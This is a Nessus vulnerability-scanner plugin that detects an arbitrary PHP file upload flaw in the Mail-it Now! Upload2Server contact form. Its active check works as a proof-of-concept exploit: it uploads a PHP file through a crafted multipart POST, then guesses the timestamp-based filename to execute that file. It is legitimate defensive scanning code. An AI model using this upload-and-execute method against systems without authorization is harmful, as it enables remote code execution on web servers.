#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19698);
  script_version("$Revision: 1.13 $");
  script_bugtraq_id(14821);
  script_osvdb_id(19436);

  script_name(english:"Mail-it Now! Upload2Server Predictable Filename Upload Arbitrary Code Execution");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application is prone to an
arbitrary file upload vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Mail-it Now! Upload2Server, a free, PHP
feedback form script supporting file uploads. 

The version of Upload2Server installed on the remote host stores
uploaded files insecurely.  An attacker may be able to exploit this
flaw to upload a file with arbitrary code and then execute it on the
remote host subject to the privileges of the web server user ID." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/mailitnow.html" );
 script_set_attribute(attribute:"solution", value:
"Remove the script or edit the script to change the upload directory." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/11");
 script_cvs_date("$Date: 2011/03/14 21:48:14 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for arbitrary file upload vulnerability in Mail-it Now! Upload2Server");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
foreach dir (cgi_dirs()) {
  # Grab the affected script.
  r = http_send_recv3(method:"GET", item:string(dir, "/contact.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it looks like Upload2Server...
  if ('<!--This script sources from SkyMinds.Net (http://www.skyminds.net/)' >< res) {
    # If safe_checks are *not* enabled...
    if (!safe_checks()) {
      # Before we actually send this, we need to record the time.
      now = unixtime();
      rand = rand_str();

      # Try to exploit the flaw.
      bound = "bound";
      boundary = string("--", bound);
      postdata = string(
        boundary, "\r\n", 
        'Content-Disposition: form-data; name="From"', "\r\n",
        "\r\n",
        # nb: an invalid address will keep mail from being sent but
        #     doesn't prevent the upload from working.
        rand, "@zj5@example.com\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="Name"', "\r\n",
        "\r\n",
        rand, "\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="Msg"', "\r\n",
        "\r\n",
        SCRIPT_NAME, "\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="fileup[]"; filename="', rand, '.php"', "\r\n",
        "Content-Type: text/plain\r\n",
        "\r\n",
        # NB: This is the actual exploit code; you could put pretty much
        #     anything you want here.
        "<?php phpinfo() ?>\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="submit"', "\r\n",
        "\r\n",
        "Send\r\n",

        boundary, "--", "\r\n"
      );
      r = http_send_recv3(method:"POST", item: dir+"/contact.php", version: 11, port: port,
      	add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound));
      if (isnull(r)) exit(0);
      res = r[2];

      # Try to run the attachment we just uploaded.
      #
      # nb: we try a range around the time because of inevitable clock skew.
      for (i = (now - 10); i < (now + 10); i++) {
        url = string(dir, "/upload/", i, "-", rand, ".php");
        r = http_send_recv3(method:"GET", item:url, port:port);
        if (isnull(r)) exit(0);
	res = r[2];

        # There's a problem if it looks like the output of phpinfo().
        if ("PHP Version" >< res) {
          report = string(
            "Nessus has successfully exploited this vulnerability by uploading\n",
            "a file with PHP code that reveals information about the PHP\n",
            "configuration on the remote host. The file is located under\n",
            "the web server's document directory as:\n",
            "         ", url, "\n",
            "You are strongly encouraged to delete this attachment as soon as\n",
            "possible as it can be run by anyone who accesses it remotely.\n"
          );
          security_hole(port:port, extra:report);
          exit(0);
        }
      }
    }

    # Check the banner, in case the clock on the nessusd or remote 
    # server are out of sync or safe checks is enabled.
    if (
      "Mail-it Now! Upload2Server" >< res &&
      egrep(string:res, pattern:"^# Mail-it Now! Upload2Server 1\.[0-5] +#$")
    ) {
      security_hole(port);
      exit(0);
    }
  }
}
